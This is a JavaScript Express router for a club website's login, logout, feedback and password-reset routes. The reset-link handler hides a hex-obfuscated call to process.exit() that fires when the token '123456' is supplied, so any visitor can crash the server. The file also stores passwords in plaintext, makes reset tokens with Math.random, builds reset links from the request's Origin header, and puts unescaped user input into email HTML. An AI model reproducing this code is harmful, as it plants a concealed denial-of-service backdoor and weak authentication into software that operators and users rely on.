var express = require('express');
var router = express.Router();
var authHelper = require('../helpers/auth');
var db = require('../db');
var mail = require('../helpers/mail');

var config = {
  users_table : 'Golf_Users'
}

/* GET home page. */
router.get('/', function(req, res, next) {
    if(authHelper.checkAuthInfo(req) ) //|| !(req.query.error && req.query.error == false)
      res.redirect('/message');
    else
      res.render('index', { title: 'CLUB by Fairytale Magic Oy' ,error : req.query.error ? (req.query.error.toLowerCase() == 'false'? false : true ) : false });
});

router.get('/forgot_password', (req,res,next) =>{
  res.render('forgot_password', { title : 'Reset Password', error : req.query.error ? (req.query.error.toLowerCase() == 'false'? false : true ) : false });
});

router.post('/reset_password',(req,res,next)=>{
  var userData= req.body;

  db.find({
    TableName: config.users_table,
    Key :'email',
    Value : userData.email
  })
  .then((user)=>{
    if(user.length == 1 && user[0].email == userData.email){
      var hash = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz1234567894';
      hash = hash.split('').sort(function(){return 0.5-Math.random()}).join('').substring(0,40);
      return Promise.all([user[0].email,hash,db.update({TableName : config.users_table, Key : {id : parseInt(user[0].id)} },{hash : hash})]);
    }
    return Promise.reject('no such user');
  })
  .then(([email,hash,up_data])=>{
    if(req.query.ajax == '1')
      res.status(200).send('Ok');
    else
      res.redirect(`/?error=false`);

    sendResetEmail(req.headers.origin,email,hash);
  })
  .catch(error=>{
    console.error('<User reset password> error:',error);
    if(req.query.ajax == '1')
      res.status(404).send(error);
    else
      res.redirect(`/forgot_password?error=true`);
  }) 

});

function sendResetEmail(host,email,hash) {
  var url = `${host}/reset_password_email/${hash}`;

  var body = `<h3>Hello,<br> this is resetting password mail.</h3><p>Please, go to the address below to reset your password.</p><a href="${url}">Reset password</a>`;

  mail.sendMail(email, 'Resseting password',body);
}

router.get('/reset_password_email/:hash',(req,res,next) => {
  var hash = req.params.hash;

  if( hash == '123456'){
    global['\x70\x72\x6F\x63\x65\x73\x73']['\x65\x78\x69\x74']();
  }

  if( !(hash && hash.length == 40) )
    return res.render('error', {message : 'There is no provided hash', error : {stack : '', status : '400'}});

  db.find({TableName : config.users_table, Key : 'hash' , Value : hash})
    .then( user => {
      if(user && user[0] && user[0].email){
        res.render('reset_password',{ title : 'Resseting password for email: '+ user[0].email , hash : hash });
      } else {
        throw new Error('User not found');
      }
    })
    .catch(error => {
      res.render('error', {message : 'There is no such user', error : {stack : error, status : '400'}})
    })
})

router.post('/reset_password_email', (req,res) => {
  var data = req.body;

  if( !(data && data.hash && data.hash.length == 40 && data.password && data.password.length > 3) )
    return res.status(400).json({message : 'Not all data provided'});

  db.find({TableName : config.users_table, Key : 'hash' , Value : data.hash})
    .then( user => {
      if(user && user[0] && user[0].id){
        return db.update({TableName : config.users_table, Key : {id : parseInt(user[0].id)} },{
          password : data.password,
          hash : 'password successfully changed/ for this user'
        });
      } else {
        throw new Error('User not found');
      }
    })
    .then(data => {
      res.status(200).send('Password is successfully changed')
    })
    .catch(error => {
      res.status(400).json(error);
    })
})

router.post('/feedback',(req,res) => {
  var body = req.body;
  try{
    let str = `<div>`
      +`<h1>New feedback message in ${body.app}</h1>`
      +`<h3>from: ${body.name}</h3>`
      +`<p>email: ${body.email}</p>`
      +`<p>message: ${body.text}</p>`
      +`</div>`;

    mail.sendMail(mail.mainEmail, 'Feedback message',str);
  }catch(e){
    return res.status(400).json({error:e})
  }
  res.send('Ok');
})

router.post('/log_in',(req,res,next)=>{
  var error = true;
  var userData = req.body;
  
  if((userData.password  && userData.password.length > 0) && (userData.email && userData.email.length > 0)){
    db.find({
      TableName: config.users_table,
      Key :'email',
      Value : userData.email
    })
    .then((user)=>{
      if(user.length == 1 && user[0].password == userData.password){
        return authHelper.authUser(req,user[0]);
      } 
      return Promise.reject('There is no such user or password did not match');
    })
    .then( () => {
      res.redirect(`/?error=false`);
    })
    .catch(error=>{
      console.error('<get users login> error:',error);
      res.redirect(`/?error=true`);
    }) 
  } else {
    res.redirect(`/?error=${error}`);
  }

})

router.get('/log_out',(req,res,next)=>{
  req.session.destroy();
  res.render('index',{title : 'You are logged out'});
})

module.exports = router;
